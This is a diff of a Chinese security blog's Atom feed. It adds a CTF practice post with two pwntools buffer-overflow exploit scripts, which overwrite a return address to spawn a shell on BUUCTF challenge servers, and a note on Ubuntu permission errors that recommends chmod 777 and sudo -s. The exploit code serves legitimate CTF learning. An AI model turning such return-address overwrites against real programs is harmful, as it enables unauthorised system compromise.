@@ -6,7 +6,7 @@
   <link href="https://dh15219984801.store/atom.xml" rel="self"/>
   
   <link href="https://dh15219984801.store/"/>
-  <updated>2020-10-18T13:25:59.965Z</updated>
+  <updated>2020-11-05T16:12:24.827Z</updated>
   <id>https://dh15219984801.store/</id>
   
   <author>
@@ -15,6 +15,50 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>BUUCTF做题记录</title>
+    <link href="https://dh15219984801.store/2020/11/05/title%20BUUCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
+    <id>https://dh15219984801.store/2020/11/05/title%20BUUCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
+    <published>2020-11-05T15:36:21.593Z</published>
+    <updated>2020-11-05T16:12:24.827Z</updated>
+    
+    <content type="html"><![CDATA[<p>​                                                                     </p><h2 id="wustctf2020-getshell"><a href="#wustctf2020-getshell" class="headerlink" title="wustctf2020_getshell"></a>wustctf2020_getshell</h2><p>exps</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug_pause</span>():</span></span><br><span class="line">    log.info(proc.pidof(p))</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">proc_name = <span class="string">&#x27;./wustctf2020_getshell&#x27;</span></span><br><span class="line">p = process(proc_name)</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">27140</span>)                                                                                                                                                                                 </span><br><span class="line">elf = ELF(proc_name)</span><br><span class="line">shell = elf.sym[<span class="string">&#x27;shell&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x18</span> + <span class="number">0x4</span>) + p32(shell)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/05/KwaTOD3yJfxRNkX.png" alt="image.png"></p><h2 id="picoctf-2018-buffer-overflow-1"><a href="#picoctf-2018-buffer-overflow-1" class="headerlink" title="picoctf_2018_buffer_overflow_1"></a>picoctf_2018_buffer_overflow_1</h2><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;i386&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwn = process(<span class="string">&quot;./buffer_overflow_1&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwn = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">27202</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwn.recvuntil(<span class="string">&quot;Please enter your string: \n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Addr = <span class="number">0x080485CB</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x28</span> + <span class="string">&#x27;A&#x27;</span>*<span class="number">0x4</span> + p32(Addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwn.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/05/8yc7Q4LstzUEre9.png" alt="image.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;​                                                                     &lt;/p&gt;
+&lt;h2 id=&quot;wustctf2020-getshell&quot;&gt;&lt;a href=&quot;#wustctf2020-getshell&quot; </summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>unbutu权限不够</title>
+    <link href="https://dh15219984801.store/2020/10/20/unbutu%E6%9D%83%E9%99%90%E4%B8%8D%E5%A4%9F/"/>
+    <id>https://dh15219984801.store/2020/10/20/unbutu%E6%9D%83%E9%99%90%E4%B8%8D%E5%A4%9F/</id>
+    <published>2020-10-19T16:25:10.611Z</published>
+    <updated>2020-11-01T14:50:51.858Z</updated>
+    
+    <content type="html"><![CDATA[<p>​                                                                       </p><p>原因：将window下的文件复制黏贴进unbutu，若直接拉则不会出现该情况</p><p>如下图：</p><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20201020001513772.png" alt="image-20201020001513772"></p><p>原因：#号提示是root用户的标志，而ubuntu默认的是普通用户，此时提示是$，并且并不能通过su切换用户命令进行切换，通常来说使用sudo即可完成对应的工作，但是如果在某些情况下希望使用带#的提示符，可以打开一个带超级用户权限的shell</p><p>百度了一下解决方法：</p><p>运行某个程序时，bash 说权限不足的问题</p><p>在Linux下，你自己编写的脚本需要执行的时候，需要加上执行权限：<br>chmod +x ./你的程序<br>或把所有权限都加上：<br>chmod +777 ./你的程序<br>再运行即可。</p><p>但出现  sudo: 无法解析主机：ubuntu: 连接超时的情况</p><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20201020001947297.png" alt="image-20201020001947297"></p><p>最后sudo -s切换root用户即可，而上面的chmod +x 表示加权限</p><p>终于打开文件emm</p><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20201020002355196.png" alt="image-20201020002355196"></p><p>tip：sudo -s切换用户不需要联网，sudo 桌面版自带的不用安装</p><p>即该命令不需要联网，就windows切换用户一样。</p><blockquote><p>参考文献：<a href="https://blog.csdn.net/jobsss/article/details/7575009">https://blog.csdn.net/jobsss/article/details/7575009</a></p></blockquote>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;​                                                                       &lt;/p&gt;
+&lt;p&gt;原因：将window下的文件复制黏贴进unbutu，若直接拉则不会出现该情况&lt;/p&gt;
+&lt;p&gt;如下图：&lt;/p&gt;
+&lt;p</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>shellcode get flag</title>
